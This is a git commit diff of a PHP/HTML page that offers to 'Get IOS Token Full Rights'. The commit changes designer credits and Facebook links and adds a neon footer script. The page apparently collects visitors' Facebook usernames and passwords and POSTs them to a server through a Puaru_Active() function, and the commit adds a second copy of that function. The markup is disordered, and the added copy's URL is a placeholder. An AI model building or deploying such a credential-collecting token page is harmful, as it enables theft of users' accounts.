f5841d48833c2bc7891d4d1721d4f36231004b47
devilhacker1994 <devil.hacker1994@gmail.com>
2017-04-03 13:52:43 -0700

    Update index.php

--- index.php
+++ index.php
@@ -16,16 +16,16 @@
   <div id="content">
 <br><br>
 <center>
-<div class="USAMAAHMAD">
-<a href="https://www.Facebook.com/osamaahmedbutt" alt="USAMAAHMAD" target="_blank">
+<div class="Armankhan">
+<a href="https://www.Facebook.com/X3.H4NDSOM3" alt="Armankhan" target="_blank">
 <img
-src="https://graph.facebook.com/100011291971738/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a><a href="https://www.Facebook.com/zain.aqdas.II" alt="USAMAAHMAD" target="_blank">
+src="https://graph.facebook.com/100009434565722/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a><a href="https://www.Facebook.com/zain.aqdas.II" alt="USAMAAHMAD" target="_blank">
 <img
 src="https://graph.facebook.com/100010212424610/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="200" height="200"></a>
 <div class="container">
 <marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="4">USAMA AHMAD & ZAIN AQDAS</font></strong></center></marquee>
   <center><font color="Red" size="+1"><marquee bgcolor="" direction="left" 
-loop="infinite" width="60%"><strong>DESIGNED BY USAMA AHMAD & ZAIN AQDAS
+loop="infinite" width="60%"><strong>DESIGNED BY ARMAN KHAN & ZAIN AQDAS
 </strong></marquee></font></center></div></div></font>
 <div class="container">
   <h2>Get IOS Token Full Rights</h2>
@@ -43,8 +43,14 @@ loop="infinite" width="60%"><strong>DESIGNED BY USAMA AHMAD & ZAIN AQDAS
 </div>
 <button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
 <p>
-<li id="trave" class="list-group-item"><img src=""> </li></p>
-
+<li id="trave" class="list-group-item"><img src="http://usamabutt.tk/usama.JPG"> </li></p>
+ Add Usama Ahmad On Facebook : <a href="https://Www.Facebook.com/100009434565722" 
+target="blank">Arman Khan</a><br>
+Add Zain Aqdas On Facebook : <a href="https://Www.Facebook.com/zain.aqdas.II" 
+target="blank">zain aqdas II</a>
+       <Br>
+     <Br>   
+<a href="https://www.Facebook.com/100009434565722" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">
 </div>
     </div>
 </div>
@@ -70,3 +76,84 @@ http.send(params);
 
 </body>
 </html>
+</script>
+  <br>
+<div id="footer">
+<script language="JavaScript1.2">
+
+
+var message="DESIGNED BY Arman Khan"
+var neonbasecolor=""
+var neontextcolor="RED"
+var flashspeed=100  //in milliseconds
+
+///No need to edit below this line/////
+
+var n=0
+if (document.all||document.getElementById){
+document.write('<font color="'+neonbasecolor+'">')
+for (m=0;m<message.length;m++)
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
+document.write('</font>')
+}
+else
+document.write(message)
+
+function crossref(number){
+var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
+return crossobj
+}
+
+function neon(){
+
+//Change all letters to base color
+if (n==0){
+for (m=0;m<message.length;m++)
+//eval("document.all.neonlight"+m).style.color=neonbasecolor
+crossref(m).style.color=neonbasecolor
+}
+
+//cycle through and change individual letters to neon color
+crossref(n).style.color=neontextcolor
+
+if (n<message.length-1)
+n++
+else{
+n=0
+clearInterval(flashing)
+setTimeout("beginneon()",1500)
+return
+}
+}
+
+function beginneon(){
+if (document.all||document.getElementById)
+flashing=setInterval("neon()",flashspeed)
+}
+beginneon()
+</script>
+
+  
+</div>
+    </div>
+</div>
+
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "IOS TOKEN BY ARMAN KHAN";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+      document.getElementById("trave").innerHTML = http.responseText;        
+    }
+}
+http.send(params);
+}
+ 
+  </script>
